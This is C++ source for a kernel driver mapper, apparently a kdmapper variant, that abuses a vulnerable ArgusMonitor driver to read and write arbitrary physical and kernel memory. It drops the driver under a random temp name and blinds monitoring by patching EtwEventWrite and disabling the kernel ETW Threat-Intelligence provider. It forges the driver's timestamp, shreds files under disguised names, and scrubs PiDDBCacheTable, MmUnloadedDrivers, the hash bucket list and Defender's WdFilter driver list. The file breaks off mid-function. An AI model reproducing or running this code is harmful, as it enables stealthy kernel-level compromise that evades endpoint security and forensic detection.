#include "intel_driver.hpp"
#include <Windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <filesystem>

#include "utils.hpp"
#include "service.hpp"
#include "nt.hpp"
#include "intel_driver_resource.hpp"

static void ArgusAddChecksum(uint8_t* buf, uint32_t total_len) {
	uint16_t sum = 0;
	for (uint32_t i = 0; i < total_len - 2; i++)
		sum += buf[i];
	buf[total_len - 2] = (uint8_t)(sum >> 8);
	buf[total_len - 1] = (uint8_t)(sum & 0xFF);
}

static bool ArgusHandshake() {
	uint8_t input[0x200] = {};
	uint8_t output[0x210] = {};
	ArgusAddChecksum(input, sizeof(input));
	DWORD bytes = 0;
	BOOL ok = DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_HANDSHAKE,
		input, sizeof(input), output, sizeof(output), &bytes, nullptr);
	if (!ok && GetLastError() == 1117)
		return true;
	return ok != FALSE;
}

static bool ArgusSlotMap(uint32_t slot, uint64_t phys_addr, uint32_t size) {
	uint8_t input[0x28] = {};
	uint8_t output[0x20] = {};
	*reinterpret_cast<uint32_t*>(input) = slot;
	*reinterpret_cast<uint64_t*>(input + 4) = phys_addr;
	*reinterpret_cast<uint32_t*>(input + 12) = size;
	*reinterpret_cast<uint32_t*>(input + 16) = 0xFF;
	*reinterpret_cast<uint32_t*>(input + 20) = 1;
	ArgusAddChecksum(input, sizeof(input));
	DWORD bytes = 0;
	if (!DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_MAP,
		input, sizeof(input), output, sizeof(output), &bytes, nullptr))
		return false;
	return *reinterpret_cast<uint64_t*>(output) != 0;
}

static void ArgusSlotUnmap(uint32_t slot) {
	uint8_t input[0x18] = {};
	*reinterpret_cast<uint32_t*>(input) = slot;
	ArgusAddChecksum(input, sizeof(input));
	DWORD bytes = 0;
	DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_UNMAP,
		input, sizeof(input), nullptr, 0, &bytes, nullptr);
}

static bool ArgusSlotReadDword(uint32_t slot, uint32_t offset, uint32_t* value) {
	uint8_t input[0x18] = {};
	uint8_t output[0x18] = {};
	*reinterpret_cast<uint32_t*>(input) = slot;
	*reinterpret_cast<uint32_t*>(input + 4) = offset;
	ArgusAddChecksum(input, sizeof(input));
	DWORD bytes = 0;
	if (!DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_RD_DW,
		input, sizeof(input), output, sizeof(output), &bytes, nullptr))
		return false;
	*value = *reinterpret_cast<uint32_t*>(output);
	return true;
}

static bool ArgusSlotWriteDword(uint32_t slot, uint32_t offset, uint32_t value) {
	uint8_t input[0x20] = {};
	*reinterpret_cast<uint32_t*>(input) = slot;
	*reinterpret_cast<uint32_t*>(input + 4) = offset;
	*reinterpret_cast<uint32_t*>(input + 8) = value;
	ArgusAddChecksum(input, sizeof(input));
	DWORD bytes = 0;
	return DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_WR_DW,
		input, sizeof(input), nullptr, 0, &bytes, nullptr) != FALSE;
}

static bool ArgusSlotReadByte(uint32_t slot, uint32_t offset, uint8_t* value) {
	uint8_t input[0x18] = {};
	uint8_t output[0x18] = {};
	*reinterpret_cast<uint32_t*>(input) = slot;
	*reinterpret_cast<uint32_t*>(input + 4) = offset;
	ArgusAddChecksum(input, sizeof(input));
	DWORD bytes = 0;
	if (!DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_RD_BYTE,
		input, sizeof(input), output, sizeof(output), &bytes, nullptr))
		return false;
	*value = output[0];
	return true;
}

static bool ArgusSlotWriteByte(uint32_t slot, uint32_t offset, uint8_t value) {
	uint8_t input[0x20] = {};
	*reinterpret_cast<uint32_t*>(input) = slot;
	*reinterpret_cast<uint32_t*>(input + 4) = offset;
	*reinterpret_cast<uint64_t*>(input + 8) = value;
	ArgusAddChecksum(input, sizeof(input));
	DWORD bytes = 0;
	return DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_WR_BYTE,
		input, sizeof(input), nullptr, 0, &bytes, nullptr) != FALSE;
}

static bool ArgusSingleReadDword(uint64_t phys_addr, uint32_t* value) {
	uint8_t input[0x20] = {};
	uint8_t output[0x18] = {};
	*reinterpret_cast<uint64_t*>(input) = phys_addr;
	*reinterpret_cast<uint32_t*>(input + 8) = 0xFF;
	*reinterpret_cast<uint32_t*>(input + 12) = 0;
	ArgusAddChecksum(input, sizeof(input));
	DWORD bytes = 0;
	if (!DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_SINGLE,
		input, sizeof(input), output, sizeof(output), &bytes, nullptr))
		return false;
	*value = *reinterpret_cast<uint32_t*>(output);
	return true;
}

HANDLE intel_driver::hDevice = 0;
ULONG64 intel_driver::ntoskrnlAddr = 0;
ULONG64 intel_driver::ntoskrnlPhysBase = 0;
ULONG32 intel_driver::ntoskrnlImageSize = 0;
bool intel_driver::runtimeReady = false;
ULONG32 intel_driver::loadedDriverTimestamp = 0;
std::wstring intel_driver::vulnerableDriverPath = L"";

static uint64_t kernel_MmGetPhysicalAddress = 0;
static std::wstring cachedDriverName = L"";
static std::wstring cachedDriverPath = L"";

std::wstring intel_driver::GetDriverNameW() {
	if (cachedDriverName.empty()) {
		cachedDriverName = kdmUtils::GenerateCryptoRandomName(8, 14);
	}
	return cachedDriverName;
}

std::wstring intel_driver::GetDriverPath() {
	if (!cachedDriverPath.empty())
		return cachedDriverPath;

	std::wstring temp = kdmUtils::GetFullTempPath();
	if (temp.empty())
		return L"";

	std::wstring subdir = temp + L"\\" + kdmUtils::GenerateCryptoRandomName(6, 10);
	CreateDirectoryW(subdir.c_str(), NULL);

	cachedDriverPath = subdir + L"\\" + GetDriverNameW() + L".sys";
	return cachedDriverPath;
}

bool intel_driver::IsRunning() {
	auto devPath = ENCW(L"\\\\.\\ArgusMonitorCTLD");
	const HANDLE file_handle = CreateFileW(devPath.c_str(), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

NTSTATUS intel_driver::AcquireDebugPrivilege() {
	HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
	if (ntdll == NULL)
		return STATUS_UNSUCCESSFUL;

	ULONG SE_DEBUG_PRIVILEGE = 20UL;
	BOOLEAN SeDebugWasEnabled;
	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
	return Status;
}

static uint8_t g_EtwOriginalBytes[8] = { 0 };
static void* g_EtwPatchAddr = nullptr;
static bool g_EtwPatched = false;

static uint64_t g_EtwTiEnableAddr = 0;
static uint32_t g_EtwTiOriginalEnable = 0;

static bool PatchUsermodeEtw() {
	HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
	if (!ntdll)
		return false;

	auto etwName = ENC("EtwEventWrite");
	g_EtwPatchAddr = reinterpret_cast<void*>(GetProcAddress(ntdll, etwName.c_str()));
	if (!g_EtwPatchAddr)
		return false;

	memcpy(g_EtwOriginalBytes, g_EtwPatchAddr, sizeof(g_EtwOriginalBytes));

	DWORD oldProt = 0;
	if (!VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), PAGE_EXECUTE_READWRITE, &oldProt))
		return false;

	uint8_t patch[] = { 0x33, 0xC0, 0xC3 };
	memcpy(g_EtwPatchAddr, patch, sizeof(patch));

	VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), oldProt, &oldProt);
	g_EtwPatched = true;
	return true;
}

static void RestoreUsermodeEtw() {
	if (!g_EtwPatched || !g_EtwPatchAddr)
		return;

	DWORD oldProt = 0;
	if (VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), PAGE_EXECUTE_READWRITE, &oldProt)) {
		memcpy(g_EtwPatchAddr, g_EtwOriginalBytes, sizeof(g_EtwOriginalBytes));
		VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), oldProt, &oldProt);
	}

	g_EtwPatched = false;
}

static bool DisableKernelEtwTi() {
	if (!intel_driver::runtimeReady)
		return false;

	static const uint8_t etwTiGuid[] = {
		0xF1, 0x54, 0xFC, 0xB8, 0x6D, 0x2E, 0x45, 0xAE,
		0x84, 0x1D, 0xD2, 0x3E, 0xBC, 0x3B, 0x83, 0xAF
	};

	BYTE guidSig[] = {
		0xF1, 0x54, 0xFC, 0xB8, 0x6D, 0x2E, 0x45, 0xAE,
		0x84, 0x1D, 0xD2, 0x3E, 0xBC, 0x3B, 0x83, 0xAF
	};
	char guidMask[] = "xxxxxxxxxxxxxxxx";

	uintptr_t guidAddr = intel_driver::FindPatternInSectionAtKernel(
		".data", intel_driver::ntoskrnlAddr, guidSig, guidMask);

	if (!guidAddr) {
		guidAddr = intel_driver::FindPatternInSectionAtKernel(
			".rdata", intel_driver::ntoskrnlAddr, guidSig, guidMask);
	}

	if (!guidAddr)
		return false;

	uint64_t provRegHandle = guidAddr - 0x20;

	uint64_t enableOffset = provRegHandle + 0x30;

	uint32_t enableInfo = 0;
	if (!intel_driver::ReadMemory(enableOffset, &enableInfo, sizeof(enableInfo)))
		return false;

	if (enableInfo == 0)
		return true;

	g_EtwTiEnableAddr = enableOffset;
	g_EtwTiOriginalEnable = enableInfo;

	uint32_t zero = 0;
	if (!intel_driver::WriteMemory(enableOffset, &zero, sizeof(zero)))
		return false;

	return true;
}

static void RestoreKernelEtwTi() {
	if (!g_EtwTiEnableAddr || !g_EtwTiOriginalEnable)
		return;
	intel_driver::WriteMemory(g_EtwTiEnableAddr, &g_EtwTiOriginalEnable, sizeof(g_EtwTiOriginalEnable));
	g_EtwTiEnableAddr = 0;
	g_EtwTiOriginalEnable = 0;
}

static ULONG32 PatchDriverTimestamp(const std::wstring& driver_path) {
	HANDLE hFile = CreateFileW(driver_path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
		return 0;

	DWORD fileSize = GetFileSize(hFile, nullptr);
	auto buffer = std::make_unique<BYTE[]>(fileSize);
	DWORD bytesRead = 0;
	ReadFile(hFile, buffer.get(), fileSize, &bytesRead, nullptr);

	auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.get());
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		CloseHandle(hFile);
		return 0;
	}

	auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(buffer.get() + dosHeader->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		CloseHandle(hFile);
		return 0;
	}

	ULONG32 newTimestamp = kdmUtils::CryptoRand32();
	ntHeaders->FileHeader.TimeDateStamp = newTimestamp;

	ntHeaders->OptionalHeader.MajorOperatingSystemVersion = 10;
	ntHeaders->OptionalHeader.MinorOperatingSystemVersion = 0;

	SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
	DWORD bytesWritten = 0;
	WriteFile(hFile, buffer.get(), fileSize, &bytesWritten, nullptr);
	CloseHandle(hFile);

	return newTimestamp;
}

static std::wstring MakeInnocuousName(const std::wstring& dir, const wchar_t* ext) {
	static const wchar_t hexChars[] = L"0123456789ABCDEF";
	wchar_t hex[9] = { 0 };
	for (int i = 0; i < 8; i++)
		hex[i] = hexChars[kdmUtils::CryptoRand32() & 0xF];
	static const wchar_t* prefixes[] = { L"WER", L"~DF", L"TMP", L"MSI", L"OLE", L"CBS" };
	const wchar_t* pfx = prefixes[kdmUtils::CryptoRand32() % _countof(prefixes)];
	return dir + L"\\" + pfx + hex + ext;
}

static void SecureDeleteFile(const std::wstring& path) {
	HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile != INVALID_HANDLE_VALUE) {
		LARGE_INTEGER fileSize;
		GetFileSizeEx(hFile, &fileSize);

		auto junkSize = static_cast<DWORD>(fileSize.QuadPart + (kdmUtils::CryptoRand32() % 4096));
		auto junk = std::make_unique<BYTE[]>(junkSize);

		HCRYPTPROV hProv = 0;
		CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
		CryptGenRandom(hProv, junkSize, junk.get());
		CryptReleaseContext(hProv, 0);

		SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
		DWORD written = 0;
		WriteFile(hFile, junk.get(), junkSize, &written, nullptr);
		FlushFileBuffers(hFile);
		CloseHandle(hFile);
	}

	std::wstring dir = path.substr(0, path.find_last_of(L'\\'));
	static const wchar_t* exts[] = { L".tmp", L".log", L".dat", L".bak" };
	std::wstring current = path;
	for (int rename_pass = 0; rename_pass < 3; rename_pass++) {
		const wchar_t* ext = exts[kdmUtils::CryptoRand32() % _countof(exts)];
		std::wstring next = MakeInnocuousName(dir, ext);
		if (MoveFileW(current.c_str(), next.c_str())) {
			current = next;
		}
	}

	for (int pass = 0; pass < 3; pass++) {
		if (_wremove(current.c_str()) == 0)
			break;
		Sleep(50);
	}

	size_t dir_sep = dir.find_last_of(L'\\');
	if (dir_sep != std::wstring::npos && dir_sep > 0) {
		static const wchar_t* dirHexChars = L"0123456789ABCDEF";
		wchar_t dirHex[9] = { 0 };
		for (int i = 0; i < 8; i++)
			dirHex[i] = dirHexChars[kdmUtils::CryptoRand32() & 0xF];
		std::wstring parent = dir.substr(0, dir_sep);
		std::wstring renamed_dir = parent + L"\\CBS" + dirHex;
		if (MoveFileW(dir.c_str(), renamed_dir.c_str())) {
			RemoveDirectoryW(renamed_dir.c_str());
			return;
		}
	}
	RemoveDirectoryW(dir.c_str());
}

bool intel_driver::PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size) {
	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
		return false;

	constexpr uint32_t SLOT = 0;
	constexpr uint32_t MAX_MAP = 0x20000;

	uint64_t done = 0;
	while (done < size) {
		uint64_t cur_pa = physical_address + done;
		uint64_t aligned = cur_pa & ~0xFFFULL;
		uint32_t off_in_page = (uint32_t)(cur_pa - aligned);
		uint32_t remaining = (uint32_t)(size - done);
		uint32_t map_size = (remaining + off_in_page + 0xFFF) & ~0xFFFU;
		if (map_size > MAX_MAP)
			map_size = MAX_MAP;
		uint32_t chunk = map_size - off_in_page;
		if (chunk > remaining)
			chunk = remaining;

		if (!ArgusSlotMap(SLOT, aligned, map_size))
			return false;

		uint8_t* dest = (uint8_t*)buffer + done;
		uint32_t pos = 0;

		while (pos < chunk && ((off_in_page + pos) & 3) != 0) {
			uint8_t val;
			if (!ArgusSlotReadByte(SLOT, off_in_page + pos, &val)) {
				ArgusSlotUnmap(SLOT);
				return false;
			}
			dest[pos++] = val;
		}

		while (pos + 4 <= chunk) {
			uint32_t val;
			if (!ArgusSlotReadDword(SLOT, off_in_page + pos, &val)) {
				ArgusSlotUnmap(SLOT);
				return false;
			}
			memcpy(dest + pos, &val, 4);
			pos += 4;
		}

		while (pos < chunk) {
			uint8_t val;
			if (!ArgusSlotReadByte(SLOT, off_in_page + pos, &val)) {
				ArgusSlotUnmap(SLOT);
				return false;
			}
			dest[pos++] = val;
		}

		ArgusSlotUnmap(SLOT);
		done += chunk;
	}
	return true;
}

bool intel_driver::PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t size) {
	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
		return false;

	constexpr uint32_t SLOT = 0;
	constexpr uint32_t MAX_MAP = 0x20000;

	uint64_t done = 0;
	while (done < size) {
		uint64_t cur_pa = physical_address + done;
		uint64_t aligned = cur_pa & ~0xFFFULL;
		uint32_t off_in_page = (uint32_t)(cur_pa - aligned);
		uint32_t remaining = (uint32_t)(size - done);
		uint32_t map_size = (remaining + off_in_page + 0xFFF) & ~0xFFFU;
		if (map_size > MAX_MAP)
			map_size = MAX_MAP;
		uint32_t chunk = map_size - off_in_page;
		if (chunk > remaining)
			chunk = remaining;

		if (!ArgusSlotMap(SLOT, aligned, map_size))
			return false;

		const uint8_t* src = (const uint8_t*)buffer + done;
		uint32_t pos = 0;

		while (pos < chunk && ((off_in_page + pos) & 3) != 0) {
			if (!ArgusSlotWriteByte(SLOT, off_in_page + pos, src[pos])) {
				ArgusSlotUnmap(SLOT);
				return false;
			}
			pos++;
		}

		while (pos + 4 <= chunk) {
			uint32_t val;
			memcpy(&val, src + pos, 4);
			if (!ArgusSlotWriteDword(SLOT, off_in_page + pos, val)) {
				ArgusSlotUnmap(SLOT);
				return false;
			}
			pos += 4;
		}

		while (pos < chunk) {
			if (!ArgusSlotWriteByte(SLOT, off_in_page + pos, src[pos])) {
				ArgusSlotUnmap(SLOT);
				return false;
			}
			pos++;
		}

		ArgusSlotUnmap(SLOT);
		done += chunk;
	}
	return true;
}

bool intel_driver::ScanForNtoskrnlPhysBase() {
	if (!ntoskrnlAddr)
		return false;

	ULONG bufferSize = 0;
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, nullptr, 0, &bufferSize);
	if (!bufferSize)
		return false;

	auto modInfo = std::make_unique<uint8_t[]>(bufferSize);
	if (!NT_SUCCESS(NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, modInfo.get(), bufferSize, &bufferSize)))
		return false;

	auto modules = reinterpret_cast<nt::PRTL_PROCESS_MODULES>(modInfo.get());
	for (ULONG i = 0; i < modules->NumberOfModules; i++) {
		if ((uint64_t)modules->Modules[i].ImageBase == ntoskrnlAddr) {
			ntoskrnlImageSize = modules->Modules[i].ImageSize;
			break;
		}
	}

	if (!ntoskrnlImageSize)
		return false;

	const uint64_t LARGE_PAGE = 0x200000;
	const uint64_t MAX_SCAN = 0x100000000ULL;

	for (uint64_t pa = 0; pa < MAX_SCAN; pa += LARGE_PAGE) {
		uint32_t mz_dw = 0;
		if (!ArgusSingleReadDword(pa, &mz_dw))
			continue;
		if ((mz_dw & 0xFFFF) != IMAGE_DOS_SIGNATURE)
			continue;

		uint32_t lfanew_dw = 0;
		if (!ArgusSingleReadDword(pa + 0x3C, &lfanew_dw))
			continue;
		LONG e_lfanew = (LONG)lfanew_dw;
		if (e_lfanew <= 0 || (ULONG)e_lfanew >= 0x800)
			continue;

		uint32_t pe_sig = 0;
		if (!ArgusSingleReadDword(pa + e_lfanew, &pe_sig))
			continue;
		if (pe_sig != IMAGE_NT_SIGNATURE)
			continue;

		uint32_t magic_dw = 0;
		if (!ArgusSingleReadDword(pa + e_lfanew + 0x18, &magic_dw))
			continue;
		if ((magic_dw & 0xFFFF) != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
			continue;

		uint32_t sizeOfImage = 0;
		if (!ArgusSingleReadDword(pa + e_lfanew + 0x50, &sizeOfImage))
			continue;
		if (sizeOfImage != ntoskrnlImageSize)
			continue;

		uint32_t exportVA = 0;
		if (!ArgusSingleReadDword(pa + e_lfanew + 0x88, &exportVA))
			continue;
		if (!exportVA)
			continue;

		ntoskrnlPhysBase = pa;
		return true;
	}

	return false;
}

bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
		address >= ntoskrnlAddr && address + size <= ntoskrnlAddr + ntoskrnlImageSize) {
		uint64_t pa = ntoskrnlPhysBase + (address - ntoskrnlAddr);
		return PhysicalRead(pa, buffer, size);
	}

	if (!runtimeReady || !kernel_MmGetPhysicalAddress)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint64_t current_va = address + offset;
		uint64_t page_offset = current_va & 0xFFF;
		uint64_t chunk = size - offset;
		if (chunk > 0x1000 - page_offset)
			chunk = 0x1000 - page_offset;

		LARGE_INTEGER pa_result = { 0 };
		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, current_va))
			return false;

		if (!pa_result.QuadPart)
			return false;

		if (!PhysicalRead(pa_result.QuadPart, (uint8_t*)buffer + offset, chunk))
			return false;

		offset += chunk;
	}
	return true;
}

bool intel_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
		address >= ntoskrnlAddr && address + size <= ntoskrnlAddr + ntoskrnlImageSize) {
		uint64_t pa = ntoskrnlPhysBase + (address - ntoskrnlAddr);
		return PhysicalWrite(pa, buffer, size);
	}

	if (!runtimeReady || !kernel_MmGetPhysicalAddress)
		return false;

	uint64_t offset = 0;
	while (offset < size) {
		uint64_t current_va = address + offset;
		uint64_t page_offset = current_va & 0xFFF;
		uint64_t chunk = size - offset;
		if (chunk > 0x1000 - page_offset)
			chunk = 0x1000 - page_offset;

		LARGE_INTEGER pa_result = { 0 };
		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, current_va))
			return false;

		if (!pa_result.QuadPart)
			return false;

		if (!PhysicalWrite(pa_result.QuadPart, (uint8_t*)buffer + offset, chunk))
			return false;

		offset += chunk;
	}
	return true;
}

bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (ntoskrnlPhysBase && ntoskrnlImageSize &&
		address >= ntoskrnlAddr && address < ntoskrnlAddr + ntoskrnlImageSize) {
		physical_address = ntoskrnlPhysBase + (address - ntoskrnlAddr);
	}
	else if (runtimeReady && kernel_MmGetPhysicalAddress) {
		LARGE_INTEGER pa_result = { 0 };
		if (!CallKernelFunction(&pa_result, kernel_MmGetPhysicalAddress, address))
			return false;
		physical_address = pa_result.QuadPart;
	}
	else {
		return false;
	}

	if (!physical_address)
		return false;

	return PhysicalWrite(physical_address, buffer, size);
}

NTSTATUS intel_driver::Load() {
	if (intel_driver::IsRunning())
		return STATUS_ALREADY_REGISTERED;

	std::vector<BYTE> driverData;

	if (!vulnerableDriverPath.empty() && std::filesystem::exists(vulnerableDriverPath)) {
		if (!kdmUtils::ReadFileToMemory(vulnerableDriverPath, &driverData))
			return STATUS_DISK_OPERATION_FAILED;
	}
	else {
		driverData.assign(argus_monitor_driver, argus_monitor_driver + argus_monitor_driver_size);
	}

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty())
		return STATUS_UNSUCCESSFUL;

	_wremove(driver_path.c_str());

	PatchUsermodeEtw();

	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(driverData.data()), driverData.size())) {
		RestoreUsermodeEtw();
		return STATUS_DISK_OPERATION_FAILED;
	}

	loadedDriverTimestamp = PatchDriverTimestamp(driver_path);
	if (!loadedDriverTimestamp) {
		RestoreUsermodeEtw();
		SecureDeleteFile(driver_path);
		return STATUS_UNSUCCESSFUL;
	}

	auto status = AcquireDebugPrivilege();
	if (!NT_SUCCESS(status)) {
		RestoreUsermodeEtw();
		SecureDeleteFile(driver_path);
		return status;
	}

	status = service::RegisterAndStart(driver_path, GetDriverNameW());
	if (!NT_SUCCESS(status)) {
		RestoreUsermodeEtw();
		SecureDeleteFile(driver_path);
		return status;
	}

	auto devOpen = ENCW(L"\\\\.\\ArgusMonitorCTLD");
	hDevice = CreateFileW(devOpen.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	RestoreUsermodeEtw();

	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
	{
		intel_driver::Unload();
		return STATUS_NOT_FOUND;
	}

	if (!ArgusHandshake()) {
		intel_driver::Unload();
		return STATUS_UNSUCCESSFUL;
	}

	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(ENC("ntoskrnl.exe"));
	if (ntoskrnlAddr == 0) {
		intel_driver::Unload();
		return STATUS_BAD_DLL_ENTRYPOINT;
	}

	if (!ScanForNtoskrnlPhysBase()) {
		intel_driver::Unload();
		return STATUS_NOT_FOUND;
	}

	kernel_MmGetPhysicalAddress = GetKernelModuleExport(ntoskrnlAddr, ENC("MmGetPhysicalAddress"));
	if (!kernel_MmGetPhysicalAddress) {
		intel_driver::Unload();
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	runtimeReady = true;

	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		intel_driver::Unload();
		return STATUS_INVALID_IMAGE_FORMAT;
	}

	DisableKernelEtwTi();

	if (!intel_driver::ClearPiDDBCacheTable()) {
		intel_driver::Unload();
		return STATUS_DELETE_PENDING | 0x1000;
	}

	if (!intel_driver::ClearKernelHashBucketList()) {
		intel_driver::Unload();
		return STATUS_DELETE_PENDING | 0x2000;
	}

	if (!intel_driver::ClearMmUnloadedDrivers()) {
		intel_driver::Unload();
		return STATUS_DELETE_PENDING | 0x3000;
	}

	if (!intel_driver::ClearWdFilterDriverList()) {
		intel_driver::Unload();
		return STATUS_DELETE_PENDING | 0x4000;
	}

	return STATUS_SUCCESS;
}

bool intel_driver::ClearWdFilterDriverList() {
	auto WdFilter = kdmUtils::GetKernelModuleAddress(ENC("WdFilter.sys"));
	if (!WdFilter)
		return true;

	auto RuntimeDriversList = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	if (!RuntimeDriversList)
		return false;

	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
	if (!RuntimeDriversCountRef)
		return false;

	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?xx???????????x");
	if (!MpFreeDriverInfoExRef) {
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?x???x???????????x");
		if (!MpFreeDriverInfoExRef)
			return false;
		MpFreeDriverInfoExRef += 0x3;
	}

	MpFreeDriverInfoExRef += 0x3;

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversList, 3, 7);
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversCountRef, 2, 6);
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory(RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress((PVOID)MpFreeDriverInfoExRef, 1, 5);

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* {
		LIST_ENTRY* Entry;
		if (!ReadMemory(Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
	};

	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		UNICODE_STRING Unicode_String;
		if (ReadMemory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
					ULONG current = 0;
					if (!ReadMemory(RuntimeDriversCount, &current, sizeof(ULONG)) || current == 0)
						return false;

					int my_idx = -1;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					int scan_max = (int)current;
					if (scan_max > 2048) scan_max = 2048;
					for (int k = 0; k < scan_max; k++) {
						PVOID value = 0;
						ReadMemory(RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							my_idx = k;
							break;
						}
					}

					if (my_idx < 0)
						return false;

					int last_idx = (int)current - 1;
					if (my_idx != last_idx) {
						PVOID tail_value = 0;
						ReadMemory(RuntimeDriversArray + (last_idx * 8), &tail_value, sizeof(PVOID));
						WriteMemory(RuntimeDriversArray + (my_idx * 8), &tail_value, sizeof(PVOID));
					}
					PVOID zero_slot = nullptr;
					WriteMemory(RuntimeDriversArray + (last_idx * 8), &zero_slot, sizeof(PVOID));

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));

					WriteMemory(uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));

					ULONG new_count = current - 1;
					WriteMemory(RuntimeDriversCount, &new_count, sizeof(ULONG));

					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;
					USHORT Magic = 0;
					ReadMemory(DriverInfo, &Magic, sizeof(USHORT));

